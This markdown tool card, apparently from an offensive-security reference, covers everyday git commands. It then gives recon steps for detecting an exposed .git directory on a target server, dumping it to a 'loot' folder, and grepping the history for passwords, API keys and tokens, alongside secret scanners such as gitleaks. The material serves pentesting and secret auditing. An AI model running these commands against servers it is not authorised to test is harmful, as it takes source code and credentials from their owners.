---
name: git
category: Utilities & Shell
description: Distributed version control — plus recon of exposed .git dirs and secrets in history.
tags: [git, vcs, version-control, secrets, dotgit, history, dumper]
---

# git

**git** is the standard distributed version control system. In an offensive context it's also a recon target: an exposed `.git/` directory or a leaked commit history often hands you source code, credentials and API keys.

> ships with most systems · `apt install git` · `brew install git` · [git-scm.com](https://git-scm.com/)

## Everyday basics

```bash
git clone <url>                     # copy a repo (add --depth 1 for a shallow clone)
git status                           # what changed
git add -A && git commit -m "msg"    # stage everything + commit
git pull --rebase                    # fetch + replay your commits on top
git push origin main                 # publish
git log --oneline --graph --all      # compact history view
git diff / git diff --cached         # unstaged / staged changes
```

## Branches & undo

```bash
git switch -c feature                 # create + switch to a branch
git switch main                       # change branch
git restore <file>                    # discard working-tree changes to a file
git restore --staged <file>           # unstage (keep the edit)
git reset --hard HEAD                 # DISCARD everything back to last commit
git revert <sha>                      # safe undo: new commit that reverses <sha>
git stash / git stash pop             # shelve changes and bring them back
```

## Digging through history

```bash
git log --oneline --all -p            # full patches across every branch
git log --follow -p -- <file>         # a single file's full history
git show <sha>                        # one commit's diff
git log -S 'password'                 # commits that added/removed a string ("pickaxe")
git log --all --oneline | wc -l       # how deep is this history
git grep 'API_KEY' $(git rev-list --all)   # search a term across ALL history
```

## Recon: exposed `.git` on a web server

A misconfigured server that serves `.git/` lets you reconstruct the whole source tree.

```bash
# 1) is it there?
curl -s -o /dev/null -w "%{http_code}\n" https://target/.git/HEAD   # 200 = jackpot

# 2) reconstruct the repo
git-dumper https://target/.git/ ./loot     # pip install git-dumper
# or the classic:  wget --mirror -I .git https://target/.git/

# 3) mine what you pulled
cd loot && git log --all -p | grep -iE 'password|secret|api[_-]?key|token'
```

## Hunting secrets in a repo

```bash
git log -p | grep -iE 'BEGIN.*PRIVATE KEY|aws_secret|password='
gitleaks detect --source .            # dedicated scanner (github.com/gitleaks/gitleaks)
trufflehog git file://./repo          # entropy + verified-secret scanner
git log --diff-filter=D --summary     # files that were DELETED (often "removed" secrets — still in history)
```

> A secret committed once lives in history forever unless the history is rewritten (`git filter-repo`) and force-pushed — deleting the file in a later commit does **not** remove it. For pulling JSON out of git-hosting APIs, pair with [curl](#/tool/curl) and [jq](#/tool/jq).
